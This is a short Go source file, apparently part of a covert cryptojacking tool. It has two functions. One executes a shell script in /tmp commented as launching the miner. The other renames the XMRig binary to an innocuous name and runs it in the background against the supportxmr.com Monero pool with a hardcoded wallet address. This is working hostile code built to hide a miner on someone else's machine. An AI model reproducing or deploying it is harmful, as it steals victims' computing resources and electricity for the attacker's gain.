package main

import (
	"os/exec"
       

        
)

//funcao para executa o vkzmn

func exec_vkzmn() {




	run_atila_vkzmn :=  exec.Command("sh"  , "-c"  ,  "/tmp/./atila_vkzmn.sh") //execute xmr_rig

	
	go run_atila_vkzmn.Run()

	

}
 



func exec_xmrig() {



	//executara o xmrig

   xmrig :=  exec.Command("sh" , "-c" ,  "mv /tmp/xmrig-6.26.0/xmrig /tmp/xmrig-6.26.0/vkzmn  ; /tmp/xmrig-6.26.0/./vkzmn   --url  pool.supportxmr.com:3333  --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1" ) 

                                                                                                                                    
  
 

   
   go xmrig.Run()

 


}
